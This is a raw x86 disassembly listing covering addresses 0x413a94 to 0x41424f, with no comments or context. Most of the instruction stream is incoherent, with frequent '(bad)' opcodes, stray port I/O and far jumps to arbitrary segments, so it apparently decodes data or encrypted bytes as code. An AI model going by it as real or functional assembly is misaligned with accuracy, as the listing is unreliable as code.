  413a94:	cld    
  413a95:	push   ecx
  413a96:	cmc    
  413a97:	mov    al,dl
  413a99:	jecxz  0x413afa
  413a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a9c:	js     0x413a46
  413a9e:	mov    esp,0x623cfcdd
  413aa3:	in     eax,dx
  413aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aa5:	ins    DWORD PTR es:[edi],dx
  413aa6:	mov    ds:0xb4abdb2a,al
  413aab:	or     eax,0xc3646c98
  413ab1:	add    ebx,DWORD PTR [ecx+0x1e]
  413ab4:	pop    ds
  413ab5:	push   ds
  413ab6:	push   ecx
  413ab7:	dec    edx
  413ab8:	push   ecx
  413ab9:	push   es
  413aba:	aas    
  413abb:	push   esi
  413abc:	sub    al,0xed
  413abe:	in     eax,0xf4
  413ac0:	or     al,0x90
  413ac2:	and    eax,0xd5611e94
  413ac7:	push   es
  413ac8:	ja     0x413a9d
  413aca:	int3   
  413acb:	sbb    cl,BYTE PTR [edi-0xcdcbd6a]
  413ad1:	ss mov ch,0x4b
  413ad4:	test   eax,0x28073f4b
  413ad9:	push   edi
  413ada:	adc    cl,ch
  413adc:	call   0xcb1187c1
  413ae1:	in     eax,dx
  413ae2:	or     BYTE PTR ds:0x69b14760,cl
  413ae8:	xchg   DWORD PTR [edx-0x22],esp
  413aeb:	cmc    
  413aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aed:	xor    DWORD PTR [eax+0x58b50aa6],eax
  413af3:	pop    edx
  413af4:	push   ebx
  413af5:	xor    bh,cl
  413af7:	cmp    al,BYTE PTR [ebp+0x56]
  413afa:	hlt    
  413afb:	mov    esp,0xdce0af41
  413b00:	inc    eax
  413b01:	add    dl,BYTE PTR [ebx-0x1bef1868]
  413b07:	aam    0x10
  413b09:	(bad)  
  413b0a:	sub    edx,DWORD PTR [ebp+0x78c96a5c]
  413b10:	push   esi
  413b11:	gs mov ah,0x18
  413b14:	push   ss
  413b15:	pop    ss
  413b16:	mov    dh,BYTE PTR ds:0xec7d2a77
  413b1c:	(bad)  
  413b1d:	cli    
  413b1e:	jmp    0xf855:0x2735c223
  413b25:	cwde   
  413b26:	test   DWORD PTR [esi],edx
  413b28:	and    al,0xf2
  413b2a:	bound  ebx,QWORD PTR [ebx+ebx*2+0x5a]
  413b2e:	in     al,0xca
  413b30:	rol    DWORD PTR [ebp-0x59],0x13
  413b34:	adc    ecx,edx
  413b36:	cli    
  413b37:	in     eax,0x76
  413b39:	dec    ebp
  413b3a:	(bad)  
  413b3b:	in     eax,dx
  413b3c:	data16 icebp 
  413b3e:	push   esp
  413b3f:	call   0x1cbfb418
  413b44:	mov    eax,0x1be8fbb7
  413b49:	inc    ebx
  413b4a:	lds    edi,FWORD PTR [edx-0x4d]
  413b4d:	mov    dl,BYTE PTR [ebp-0x25]
  413b50:	jl     0x413b2a
  413b52:	iret   
  413b53:	ds pusha 
  413b55:	adc    eax,0x23b79c79
  413b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b5b:	loopne 0x413b9e
  413b5d:	mov    edi,0x5a52e2c3
  413b62:	fdiv   st(7),st
  413b64:	mov    WORD PTR [esi+esi*2+0x3d],cs
  413b68:	push   ebx
  413b69:	call   0xf025ba9e
  413b6e:	inc    ecx
  413b6f:	add    eax,0x7788eb8
  413b74:	inc    ebp
  413b75:	retf   
  413b76:	shr    BYTE PTR [esp+ecx*4-0x1b5ee119],cl
  413b7d:	and    esi,DWORD PTR [eax*1+0x1d7167ad]
  413b84:	lods   al,BYTE PTR ds:[esi]
  413b85:	jnp    0x413bb5
  413b87:	add    eax,0x7e0ed973
  413b8c:	mov    cs,WORD PTR ds:0xab8acbbf
  413b92:	dec    esp
  413b93:	mov    dh,BYTE PTR [eax+0x35]
  413b96:	xchg   BYTE PTR [ebx+0x3afe8e9a],dh
  413b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b9d:	pop    edi
  413b9e:	add    esi,eax
  413ba0:	xchg   edi,eax
  413ba1:	add    DWORD PTR [ebp-0x16d75f68],ebx
  413ba7:	sbb    ebx,ecx
  413ba9:	(bad)  
  413baa:	stc    
  413bab:	nop
  413bac:	fst    DWORD PTR [esi-0x17]
  413baf:	mov    edx,0x3b50b346
  413bb4:	push   ds
  413bb5:	jl     0x413b54
  413bb7:	inc    edx
  413bb8:	and    BYTE PTR fs:[ecx],ah
  413bbb:	inc    edx
  413bbc:	and    BYTE PTR [ebp+ebx*4+0xe2b8084],dh
  413bc3:	shl    DWORD PTR gs:[edi],1
  413bc6:	dec    esp
  413bc7:	jecxz  0x413b5f
  413bc9:	mov    BYTE PTR [edi+0x1d30d98f],cl
  413bcf:	adc    eax,0xd06bc224
  413bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bd5:	adc    BYTE PTR [edi-0x24],bh
  413bd8:	mov    al,0xe5
  413bda:	push   ss
  413bdb:	and    eax,0x4927cec6
  413be0:	pop    ebp
  413be1:	inc    BYTE PTR [edi-0xa]
  413be4:	stos   BYTE PTR es:[edi],al
  413be5:	pop    eax
  413be6:	sbb    edx,DWORD PTR [ecx+edi*8+0x4093d517]
  413bed:	push   edx
  413bee:	jnp    0x413b72
  413bf0:	xchg   ebx,eax
  413bf1:	aas    
  413bf2:	push   ebp
  413bf3:	ffreep st(6)
  413bf5:	fbstp  TBYTE PTR [eax+0x249e9628]
  413bfb:	sbb    ecx,DWORD PTR [ebx+edx*2]
  413bfe:	(bad)  
  413bff:	push   0xb8082b13
  413c04:	push   es
  413c05:	push   0xa
  413c07:	shl    BYTE PTR [edx+0x2b5e4e00],cl
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	push   ds
  413c2a:	inc    eax
  413c2b:	jge    0x413c33
  413c2d:	add    al,BYTE PTR [eax]
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	repnz scas al,BYTE PTR es:[edi]
  413c37:	(bad)  
  413c38:	pop    ebp
  413c39:	test   esp,ecx
  413c3b:	mov    DWORD PTR [ebp+0x41],ebp
  413c3e:	loopne 0x413c8e
  413c40:	bound  edi,QWORD PTR [esi]
  413c42:	(bad)  
  413c43:	sti    
  413c44:	shl    cl,0xe8
  413c47:	or     DWORD PTR [esi+0x280c88af],eax
  413c4d:	stos   BYTE PTR es:[edi],al
  413c4e:	mov    esi,0x32735f4e
  413c53:	dec    ebp
  413c54:	mov    ebx,0xa3ef5d58
  413c59:	in     eax,dx
  413c5a:	fcom   st(4)
  413c5c:	outs   dx,BYTE PTR es:[esi]
  413c5e:	icebp  
  413c5f:	sahf   
  413c60:	push   ebx
  413c61:	xchg   ecx,eax
  413c62:	cmp    BYTE PTR [edi+0x49747e83],0x2a
  413c69:	fiadd  WORD PTR [eax]
  413c6b:	sub    al,0x91
  413c6d:	(bad)  
  413c6e:	outs   dx,BYTE PTR ds:[esi]
  413c6f:	data16 int3 
  413c71:	rcl    DWORD PTR ds:0xa8acceec,cl
  413c77:	mov    ecx,0xec6208ec
  413c7c:	shr    esi,1
  413c7e:	test   DWORD PTR [edx-0xd],ebp
  413c81:	scas   eax,DWORD PTR es:[edi]
  413c82:	pop    edi
  413c83:	ins    DWORD PTR es:[edi],dx
  413c84:	gs mov dh,0xcd
  413c87:	mov    ds:0x961c12e7,eax
  413c8c:	inc    esi
  413c8d:	in     al,0x7b
  413c8f:	aad    0xb2
  413c91:	icebp  
  413c92:	adc    edx,DWORD PTR [edx+0x76]
  413c95:	popa   
  413c96:	adc    ch,cl
  413c98:	xchg   edi,eax
  413c99:	cmp    dh,BYTE PTR [edi+0x19e83bfb]
  413c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ca0:	dec    ebx
  413ca1:	inc    esi
  413ca2:	data16 icebp 
  413ca4:	aam    0x95
  413ca6:	pop    eax
  413ca7:	inc    edi
  413ca8:	dec    eax
  413ca9:	shrd   DWORD PTR [ebx+0x50],esi,cl
  413cad:	scas   eax,DWORD PTR es:[edi]
  413cae:	mov    bh,0xab
  413cb0:	adc    BYTE PTR [edx+0x4fbfc13c],al
  413cb6:	or     al,0x30
  413cb8:	pop    ecx
  413cb9:	pusha  
  413cba:	adc    eax,0xf2252177
  413cbf:	xor    bh,bh
  413cc1:	dec    ebx
  413cc2:	(bad)  
  413cc3:	sti    
  413cc4:	pop    ebp
  413cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cc6:	call   0x7f9637db
  413ccb:	(bad)  
  413ccc:	js     0x413ceb
  413cce:	enter  0x4d9c,0x49
  413cd2:	push   es
  413cd3:	outs   dx,BYTE PTR ds:[esi]
  413cd4:	fnstcw WORD PTR [ecx]
  413cd6:	and    al,0x2a
  413cd8:	xchg   ebx,eax
  413cd9:	fld    DWORD PTR ds:0x85a45b82
  413cdf:	and    eax,0x5b6f9777
  413ce4:	test   DWORD PTR [esi-0x5f3d2e94],ecx
  413cea:	inc    esi
  413ceb:	div    DWORD PTR [esi]
  413ced:	das    
  413cee:	jl     0x413cde
  413cf0:	dec    ecx
  413cf1:	rsqrtps xmm3,XMMWORD PTR [esi+eax*1+0x4e]
  413cf6:	(bad)  
  413cf7:	mov    dh,0x76
  413cf9:	in     al,dx
  413cfa:	sbb    esi,esi
  413cfc:	call   0x38f7eaa8
  413d01:	aam    0x6
  413d03:	pusha  
  413d04:	xor    eax,0xcdb279fe
  413d09:	hlt    
  413d0a:	pop    es
  413d0b:	fisttp DWORD PTR [ecx]
  413d0d:	nop
  413d0e:	mov    bl,0x89
  413d10:	scas   al,BYTE PTR es:[edi]
  413d11:	dec    ebp
  413d12:	adc    al,BYTE PTR [ecx+0x236b13f8]
  413d18:	out    0xf6,al
  413d1a:	lea    edi,[edx+0xcfa3478]
  413d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d21:	add    DWORD PTR [edi+ecx*8],eax
  413d24:	cmp    al,0xe0
  413d26:	leave  
  413d27:	mov    dl,0xb7
  413d29:	leave  
  413d2a:	stos   BYTE PTR es:[edi],al
  413d2b:	in     eax,0x54
  413d2d:	out    dx,al
  413d2e:	push   ebp
  413d2f:	repz cmp BYTE PTR [edi+0x11],cl
  413d33:	inc    ebp
  413d34:	rcr    BYTE PTR [ebp+0x77],0xb2
  413d38:	mov    eax,0xea799ebf
  413d3d:	inc    edi
  413d3e:	ja     0x413d3c
  413d40:	jp     0x413d40
  413d42:	mov    eax,ds:0x9b4737cf
  413d47:	outs   dx,DWORD PTR ds:[esi]
  413d48:	dec    esi
  413d49:	mov    BYTE PTR [ebx],dl
  413d4b:	ffree  st(6)
  413d4d:	mov    al,ds:0x21de247c
  413d52:	push   ebx
  413d53:	enter  0xa5ef,0xef
  413d57:	pop    esi
  413d58:	test   BYTE PTR [ebp+0x1281f583],bl
  413d5e:	(bad)  
  413d5f:	sbb    DWORD PTR [ebp+0x14],edi
  413d62:	xor    dh,al
  413d64:	xor    eax,0xa31bccc1
  413d69:	test   eax,0xc6f0997
  413d6e:	push   es
  413d6f:	pop    ecx
  413d70:	push   es
  413d71:	sbb    edx,DWORD PTR [eax]
  413d73:	shr    BYTE PTR [edx+0xf],0xb3
  413d77:	fistp  DWORD PTR [ebp+0x73]
  413d7a:	xchg   esp,eax
  413d7b:	aaa    
  413d7c:	ror    BYTE PTR [eax],cl
  413d7e:	mov    edi,0x50d5346e
  413d83:	and    eax,0x938d6537
  413d88:	into   
  413d89:	mov    ch,0x8b
  413d8b:	lods   al,BYTE PTR ds:[esi]
  413d8c:	clc    
  413d8d:	jne    0x413d13
  413d8f:	xor    edi,eax
  413d91:	mov    dh,0x5f
  413d93:	dec    esp
  413d94:	push   cs
  413d95:	dec    esp
  413d96:	pop    ebx
  413d97:	or     ebp,DWORD PTR [eax+0x78]
  413d9a:	xor    esi,DWORD PTR [edi+0x1d]
  413d9d:	xor    eax,0xa9274184
  413da2:	mov    ds:0xb6cfe98e,al
  413da7:	sub    DWORD PTR [ebp-0x24660f9a],ebp
  413dad:	adc    eax,0xbde3ee3b
  413db2:	cwde   
  413db3:	xchg   edi,eax
  413db4:	jmp    0x5288:0x775a9359
  413dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dbc:	in     eax,dx
  413dbd:	mov    cl,0xeb
  413dbf:	mov    ebx,0xf1d5848e
  413dc4:	mov    DWORD PTR [eax+0x7c220812],0x8c44534f
  413dce:	xchg   BYTE PTR [edx-0x10],ch
  413dd1:	ds aaa 
  413dd3:	push   ebx
  413dd4:	xchg   esi,ebp
  413dd6:	rcl    BYTE PTR [eax-0x33],cl
  413dd9:	mov    dl,0x20
  413ddb:	sbb    DWORD PTR [esi-0x60],0xf3b926c
  413de2:	(bad)  
  413de3:	stos   DWORD PTR es:[edi],eax
  413de4:	call   0xcca719aa
  413de9:	test   eax,0x129ba732
  413dee:	(bad)  
  413def:	adc    al,BYTE PTR ds:0x6857b224
  413df5:	mov    ecx,?
  413df7:	and    al,0xcc
  413df9:	sbb    DWORD PTR [ebp-0x46efbf7b],ebp
  413dff:	idiv   ah
  413e01:	mov    ch,0xa4
  413e03:	inc    edi
  413e04:	mov    ecx,0xb2c0d1d
  413e09:	sbb    cl,BYTE PTR [ebx-0x1e97c521]
  413e0f:	stos   BYTE PTR es:[edi],al
  413e10:	or     ebx,DWORD PTR [edx-0x37]
  413e13:	or     eax,0x7a5f966f
  413e18:	(bad)  
  413e1a:	shl    DWORD PTR [esp+esi*8-0x12d64bc4],0x98
  413e22:	stos   BYTE PTR es:[edi],al
  413e23:	mov    cs,WORD PTR [ecx+0x23]
  413e26:	pop    ecx
  413e27:	mov    esp,ebx
  413e29:	or     eax,0x39f66c09
  413e2e:	imul   ebx,DWORD PTR [eax+0x5d6e5175],0x8a2a715
  413e38:	xchg   ecx,eax
  413e39:	lahf   
  413e3a:	jb     0x413e0c
  413e3c:	xlat   BYTE PTR ds:[ebx]
  413e3d:	iret   
  413e3e:	lds    edi,FWORD PTR [edx-0x5c]
  413e41:	xor    eax,0x41f1c7f3
  413e46:	fidivr DWORD PTR [esi+0xe]
  413e49:	mov    esp,0x9196fdbe
  413e4e:	arpl   WORD PTR [ebx],ax
  413e50:	adc    BYTE PTR [ebx+0x586aa6a3],dh
  413e56:	pop    ebx
  413e57:	mov    esi,0x485c395d
  413e5c:	adc    ebx,eax
  413e5e:	shr    bl,cl
  413e60:	cli    
  413e61:	xor    al,0xb8
  413e63:	in     eax,0x2a
  413e65:	lods   al,BYTE PTR ds:[esi]
  413e66:	push   eax
  413e67:	js     0x413ebc
  413e69:	pop    edi
  413e6a:	imul   eax,DWORD PTR [edx+esi*4],0xbd59e98d
  413e71:	mov    bl,BYTE PTR ds:0x374acfce
  413e77:	sbb    eax,0xc2dd6fec
  413e7c:	mov    ch,0xa6
  413e7e:	mov    WORD PTR [ecx-0x39],?
  413e81:	stc    
  413e82:	out    0x1d,eax
  413e84:	jmp    0xa208:0x72c702e8
  413e8b:	mov    ds:0xf8b184c2,eax
  413e90:	push   esp
  413e91:	adc    eax,0xe785782f
  413e96:	ror    BYTE PTR [ebx-0x1b3c33df],1
  413e9c:	pop    ss
  413e9d:	push   ds
  413e9e:	stos   BYTE PTR es:[edi],al
  413e9f:	lods   al,BYTE PTR ds:[esi]
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	adc    DWORD PTR [edi+0x6efaf1e],ecx
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	dec    esp
  413ec4:	jb     0x413f27
  413ec6:	int3   
  413ec7:	fimul  WORD PTR [edx+0x2d6c1d9c]
  413ecd:	and    BYTE PTR [ecx],0x18
  413ed0:	jb     0x413ec9
  413ed2:	sub    al,0x88
  413ed4:	sub    edi,DWORD PTR [ecx+0x22f9896b]
  413eda:	or     dh,BYTE PTR [ebp-0x1071fdff]
  413ee0:	imul   esi,eax,0xb9e681d2
  413ee6:	pop    ebx
  413ee7:	repz xor al,0x9b
  413eea:	ja     0x413f30
  413eec:	xor    cl,BYTE PTR [eax]
  413eee:	and    bh,BYTE PTR [ebp+0x10b1a575]
  413ef4:	sub    dh,ah
  413ef6:	sbb    eax,0x4121b229
  413efb:	xor    eax,0xe79b7e1d
  413f00:	dec    ebx
  413f01:	push   edx
  413f02:	jae    0x413eb0
  413f04:	mov    ecx,0xb182fa7a
  413f09:	inc    ebx
  413f0a:	push   ds
  413f0b:	add    DWORD PTR [edi],esp
  413f0d:	mov    eax,0x48373825
  413f12:	add    bl,BYTE PTR [esi+0x43]
  413f15:	pop    ecx
  413f16:	data16 jnp 0x413f57
  413f19:	push   ecx
  413f1a:	dec    edi
  413f1b:	fld    DWORD PTR [edi+edx*1]
  413f1e:	push   ebx
  413f1f:	add    al,0x4c
  413f21:	adc    esi,edi
  413f23:	pop    edx
  413f24:	cld    
  413f25:	(bad)  
  413f26:	fiadd  WORD PTR [ebx+0x72]
  413f29:	cwde   
  413f2a:	pop    ebx
  413f2b:	in     eax,0xdc
  413f2d:	ror    DWORD PTR [edx],0xb
  413f30:	lods   ax,WORD PTR ds:[esi]
  413f32:	dec    ebx
  413f33:	mov    edi,0xd06b69cc
  413f38:	outs   dx,DWORD PTR ds:[esi]
  413f39:	cmp    eax,0x47ceb249
  413f3e:	push   ebp
  413f3f:	pop    esi
  413f40:	add    bh,BYTE PTR [ebp-0x5bbf5c14]
  413f46:	ins    BYTE PTR es:[edi],dx
  413f47:	adc    ecx,DWORD PTR [ecx-0x60]
  413f4a:	into   
  413f4b:	cdq    
  413f4c:	nop
  413f4d:	and    DWORD PTR [eax+ecx*4+0x456f26a1],edi
  413f54:	adc    eax,0xa16ce425
  413f59:	test   al,0x1e
  413f5b:	xor    eax,DWORD PTR [edi]
  413f5d:	fistp  QWORD PTR [edx]
  413f5f:	sub    eax,0xf6901e6f
  413f64:	cmp    eax,DWORD PTR [ebx+eiz*1]
  413f67:	adc    DWORD PTR ds:0x7ff3ff93,eax
  413f6d:	stos   DWORD PTR es:[edi],eax
  413f6e:	fnsave [ebx]
  413f70:	xchg   esp,eax
  413f71:	push   cs
  413f72:	dec    ecx
  413f73:	jmp    0x464325db
  413f78:	mov    dl,0x1b
  413f7a:	addr16 and eax,0xf87daef7
  413f80:	ret    0x752c
  413f83:	cld    
  413f84:	pop    sp
  413f86:	adc    esi,esi
  413f88:	data16 jl 0x414007
  413f8b:	add    BYTE PTR [edx],bl
  413f8d:	imul   edi,DWORD PTR [edx+0x609c55f5],0xffffffe1
  413f94:	fistp  DWORD PTR [ecx]
  413f96:	jns    0x413f36
  413f98:	retf   
  413f99:	jmp    0x1b25:0x823cdc2e
  413fa0:	jge    0x413fc2
  413fa2:	ret    
  413fa3:	outs   dx,BYTE PTR ds:[esi]
  413fa4:	sub    al,0xe0
  413fa6:	repnz fsubr DWORD PTR [ecx-0x72]
  413faa:	sbb    al,BYTE PTR [edx]
  413fac:	push   0xde6af094
  413fb1:	push   ds
  413fb2:	ret    0xbd3d
  413fb5:	sbb    bl,BYTE PTR [esi]
  413fb7:	pop    esi
  413fb8:	daa    
  413fb9:	popa   
  413fba:	bound  ebx,QWORD PTR [edi]
  413fbc:	sbb    BYTE PTR [ecx],dh
  413fbe:	cdq    
  413fbf:	iret   
  413fc0:	or     eax,0xf47096b7
  413fc5:	test   BYTE PTR ds:0x5d2f7558,al
  413fcb:	sbb    al,0x27
  413fcd:	xor    eax,0x76dc602c
  413fd2:	pop    ss
  413fd3:	push   eax
  413fd4:	sub    bl,cl
  413fd6:	jp     0x413f63
  413fd8:	mov    cl,0x65
  413fda:	xchg   ebp,eax
  413fdb:	inc    eax
  413fdc:	sbb    ecx,esp
  413fde:	dec    edi
  413fdf:	int3   
  413fe0:	repz pop edx
  413fe2:	cwde   
  413fe3:	fimul  DWORD PTR [esi+edi*8+0x38fa0830]
  413fea:	push   edx
  413feb:	push   ss
  413fec:	fs repnz dec esp
  413fef:	pop    esp
  413ff0:	(bad)  
  413ff1:	jge    0x413f82
  413ff3:	push   0x16
  413ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ff6:	jl     0x414002
  413ff8:	scas   eax,DWORD PTR es:[edi]
  413ff9:	or     DWORD PTR [edx-0x26],0x5865780f
  414000:	(bad)  
  414001:	rcr    BYTE PTR [eax-0x4b2c5c39],0x9f
  414008:	sbb    al,0xda
  41400a:	jb     0x41402d
  41400c:	jo     0x413fcd
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	mulps  xmm6,XMMWORD PTR [edi-0x30218b11]
  414016:	ss jno 0x41408f
  414019:	and    bh,BYTE PTR ds:0xaa92f99b
  41401f:	fimul  WORD PTR [ecx]
  414021:	cwde   
  414022:	not    DWORD PTR [edx]
  414024:	inc    ebp
  414025:	fwait
  414026:	mov    edi,0xabea47c9
  41402b:	xchg   DWORD PTR [esi+0x1b8feb5c],ebp
  414031:	repnz div BYTE PTR [edx]
  414034:	outs   dx,BYTE PTR ds:[esi]
  414035:	push   ebp
  414036:	shl    BYTE PTR [esi+eax*4-0x4073c0da],0xc0
  41403e:	inc    esi
  41403f:	mov    ebp,edx
  414041:	hlt    
  414042:	les    ebp,FWORD PTR [ecx+0x2713aca7]
  414048:	pop    edx
  414049:	push   es
  41404a:	mov    ebp,0x7fd8f322
  41404f:	sbb    al,0xc0
  414051:	mov    WORD PTR [ecx+0x4b],gs
  414054:	mov    al,0x0
  414056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414057:	jl     0x413fe5
  414059:	and    BYTE PTR [ebx-0x59c60195],cl
  41405f:	mov    eax,0xf7aefb4b
  414064:	cmp    eax,0x6081ac9b
  414069:	dec    esp
  41406a:	stc    
  41406b:	sar    DWORD PTR [ebx],0x32
  41406e:	clc    
  41406f:	xchg   esp,eax
  414070:	retf   
  414071:	lods   al,BYTE PTR ds:[esi]
  414072:	stos   BYTE PTR es:[edi],al
  414073:	or     ebp,ecx
  414075:	push   ss
  414076:	das    
  414077:	call   0x1a53:0x8094f99
  41407e:	mov    al,ds:0x9d3f4ba0
  414083:	dec    esi
  414084:	push   ss
  414085:	sub    ch,dh
  414087:	iret   
  414088:	lods   eax,DWORD PTR ds:[esi]
  414089:	pop    ebx
  41408a:	mov    ebp,0xb0900008
  41408f:	leave  
  414090:	mov    esi,0xc37c0663
  414095:	pop    ecx
  414096:	lods   al,BYTE PTR ds:[esi]
  414097:	mov    cl,0xfd
  414099:	jno    0x414047
  41409b:	xor    DWORD PTR [ebx+edx*8-0x776427e],eax
  4140a2:	cmp    BYTE PTR [esi+0x27],cl
  4140a5:	retf   
  4140a6:	test   DWORD PTR [eax+0x2e1d00be],esi
  4140ac:	iret   
  4140ad:	xchg   DWORD PTR [edi],edi
  4140af:	pushf  
  4140b0:	arpl   WORD PTR [edx],dx
  4140b2:	mov    bh,0x5c
  4140b4:	shl    BYTE PTR [edx+edx*8],cl
  4140b7:	sar    cl,1
  4140b9:	jge    0x4140c8
  4140bb:	cli    
  4140bc:	mov    BYTE PTR [edx],cl
  4140be:	pop    esp
  4140bf:	sti    
  4140c0:	scas   eax,DWORD PTR es:[edi]
  4140c1:	imul   ecx,DWORD PTR [ecx-0x30eddc6a],0x32
  4140c8:	and    ebp,DWORD PTR [ebp-0x39ac5e3d]
  4140ce:	pushf  
  4140cf:	xchg   DWORD PTR [eax],ebx
  4140d1:	sub    ah,bl
  4140d3:	and    eax,ebp
  4140d5:	gs mov esi,0x3a622ed5
  4140db:	adc    al,0xb
  4140dd:	(bad)  
  4140de:	nop
  4140df:	push   esi
  4140e0:	mov    eax,0xaa470044
  4140e5:	mov    BYTE PTR [edx+0xc],dh
  4140e8:	(bad)  
  4140e9:	test   al,0xda
  4140eb:	cs push esp
  4140ed:	and    BYTE PTR [ecx+0x6a87af5a],0xac
  4140f4:	aad    0xd8
  4140f6:	pushf  
  4140f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140f8:	pusha  
  4140f9:	mov    dh,0x8
  4140fb:	xor    BYTE PTR [edi],ch
  4140fd:	je     0x414099
  4140ff:	aam    0x8b
  414101:	and    DWORD PTR [ecx],ebx
  414103:	in     eax,0xfa
  414105:	js     0x4140bf
  414107:	xor    edx,0xb89ee78a
  41410d:	enter  0x6c53,0x31
  414111:	loope  0x414168
  414113:	mov    al,ds:0xf793b994
  414118:	jbe    0x414173
  41411a:	in     eax,dx
  41411b:	jo     0x414158
  41411d:	ret    
  41411e:	vpmacsdql xmm4,xmm7,xmm5,XMMWORD PTR [ebp-0x26178159]
  414128:	jae    0x414198
  41412a:	and    BYTE PTR [ebx],dl
  41412c:	sti    
  41412d:	shl    BYTE PTR [ebx],1
  41412f:	fsubr  st,st(1)
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xa2145a14
  414142:	jmp    0x787f:0x4549c57
  414149:	in     eax,0x7e
  41414b:	js     0x4141c5
  41414d:	sbb    eax,0xde1927bf
  414152:	out    dx,al
  414153:	stc    
  414154:	mov    ds:0x52bb48e2,eax
  414159:	add    dh,BYTE PTR [ebx-0x415139fb]
  41415f:	xchg   ecx,eax
  414160:	rcl    DWORD PTR [eax+0x4d],1
  414163:	inc    eax
  414164:	sub    BYTE PTR [esi+ecx*2],ah
  414167:	push   0x6b
  414169:	jae    0x414178
  41416b:	in     eax,0xb
  41416d:	pop    ecx
  41416e:	clc    
  41416f:	loopne 0x41412f
  414171:	cdq    
  414172:	cmc    
  414173:	sti    
  414174:	idiv   BYTE PTR [esi-0xf9548bd]
  41417a:	sub    esi,DWORD PTR [ebx+edi*1-0x55]
  41417e:	and    al,0xa4
  414180:	push   cs
  414181:	fwait
  414182:	pop    eax
  414183:	pop    edx
  414184:	inc    ecx
  414185:	push   esi
  414186:	mov    al,ds:0x9aab9d2f
  41418b:	adc    eax,0x72431ef6
  414190:	adc    DWORD PTR [esi],ebp
  414192:	fild   QWORD PTR [ecx+0x13]
  414195:	leave  
  414196:	adc    eax,0x926e6c6a
  41419b:	cwde   
  41419c:	mov    eax,ds:0xbe155510
  4141a1:	out    0x47,al
  4141a3:	and    al,BYTE PTR [edx+eiz*8+0x62]
  4141a7:	mov    al,0x70
  4141a9:	ins    BYTE PTR es:[edi],dx
  4141aa:	xchg   esp,eax
  4141ab:	sub    DWORD PTR [edx],esi
  4141ad:	js     0x4141f0
  4141af:	dec    esi
  4141b0:	stc    
  4141b1:	mov    cl,0x9
  4141b3:	pop    esp
  4141b4:	or     ch,BYTE PTR [ecx]
  4141b6:	jle    0x41422b
  4141b8:	imul   BYTE PTR [ecx-0x4a5f476f]
  4141be:	inc    esi
  4141bf:	jle    0x4141e6
  4141c1:	jnp    0x41422b
  4141c3:	xchg   edx,eax
  4141c4:	mov    dh,0xa0
  4141c6:	push   cs
  4141c7:	nop
  4141c8:	std    
  4141c9:	sti    
  4141ca:	(bad)  
  4141cc:	(bad)
  4141cf:	xor    BYTE PTR [edx],0x3a
  4141d2:	and    al,ch
  4141d4:	stc    
  4141d5:	cmp    DWORD PTR [edx+0x35f6fb51],edx
  4141db:	mov    cl,0xb0
  4141dd:	mov    al,ds:0x2c9fc41d
  4141e2:	or     edx,eax
  4141e4:	xchg   ecx,eax
  4141e5:	push   cs
  4141e6:	push   eax
  4141e7:	hlt    
  4141e8:	mov    edi,0x8a8c3509
  4141ed:	add    BYTE PTR [edx+0x60d99df2],bl
  4141f3:	sbb    dh,BYTE PTR [ebx+0x40b5b9e6]
  4141f9:	or     DWORD PTR [ebp-0x3a],ebx
  4141fc:	not    DWORD PTR [ebx]
  4141fe:	ret    
  4141ff:	cmp    bl,BYTE PTR [esi+0x74bb71e]
  414205:	xchg   cl,bl
  414207:	stos   BYTE PTR es:[edi],al
  414208:	pushf  
  414209:	test   BYTE PTR [edx],al
  41420b:	mov    dl,0x63
  41420d:	pusha  
  41420e:	arpl   WORD PTR [edi-0x30743518],di
  414214:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  414216:	dec    ebx
  414217:	(bad)  
  414218:	dec    ebx
  414219:	div    eax
  41421b:	ss aam 0x6f
  41421e:	out    0x24,al
  414220:	mov    ecx,0xa84cd76
  414225:	retf   0x606f
  414228:	imul   edx,DWORD PTR [edx+0x55],0x2ba5a87
  41422f:	inc    eax
  414230:	pop    es
  414231:	outs   dx,BYTE PTR ds:[esi]
  414232:	sar    ebx,0xb9
  414235:	outs   dx,BYTE PTR ds:[esi]
  414236:	pop    edi
  414237:	stc    
  414238:	dec    eax
  414239:	shl    DWORD PTR [ebx],1
  41423b:	ficomp WORD PTR [esi+0x1c9b60c3]
  414241:	std    
  414242:	jne    0x41422d
  414244:	sbb    eax,0x784d0e51
  414249:	mov    DWORD PTR [esi-0x67],edi
  41424c:	cmp    al,BYTE PTR [ebp-0x35]
  41424f:	addr16 es call 0xf7f:0x8f0494a6
